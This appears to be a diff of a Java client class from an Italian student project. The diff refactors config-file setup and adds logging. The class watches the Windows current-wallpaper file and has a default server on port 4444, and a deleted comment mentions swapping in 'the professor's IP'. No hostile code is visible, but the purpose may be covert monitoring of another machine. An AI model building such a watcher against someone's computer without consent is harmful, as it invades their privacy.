@@ -11,7 +11,6 @@ import static it.enne.curie.common.CustomConfig.*;
 
 public class Client {
 
-    //TODO: Sostituire con l'IP del prof
     private static final String[] DEFAULT_SERVER = new String[]{"127.0.0.1", "4444"};
     private static final String CHECK_FILE = HOME + "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper";
 
@@ -26,30 +25,27 @@ public class Client {
 
     public void start() {
         //TODO: @Ale config in common
-
-        boolean isCreated;
-        // controlla esistenza
+        int tmpC, tmpF;
         try {
             // controllo cartella
             File cartella = new File(getFolderName());
-            if (!cartella.exists() || !cartella.isFile()) {
-                isCreated = cartella.mkdirs();
-                if (isCreated) {
-                    System.out.println("folder created");
-                }
+            tmpC = checkFolder(cartella);
+            if (tmpC == 1) {
+                System.out.println("folder created : " + cartella);
             }
+
             // controllo file config
             File file = new File(getConfigPath());
-            if (!file.exists()) {
-                isCreated = file.createNewFile();
-                if (isCreated) {
-                    System.out.println("config created");
-                }
+            tmpF = checkFile(file);
+            if (tmpF == 1) {
+                System.out.println("file created : " + file);
                 CustomConfigWriter(DEFAULT_SERVER, file);
             }
+
         } catch (Exception e) {
-            System.err.println("errore creazione file");
+            System.err.println(e.getMessage());
         }
+
 
         String[] SERVER = DEFAULT_SERVER;
 
@@ -64,6 +60,7 @@ public class Client {
         File file = new File(CHECK_FILE);
         long mod = file.lastModified();
 
+        System.out.println("Client avviato");
         boolean errore = false;
         while (!errore) {
             try {
@@ -85,6 +82,7 @@ public class Client {
                 errore = true;
             }
         }
+        System.out.println("Client terminato");
     }
 
 }
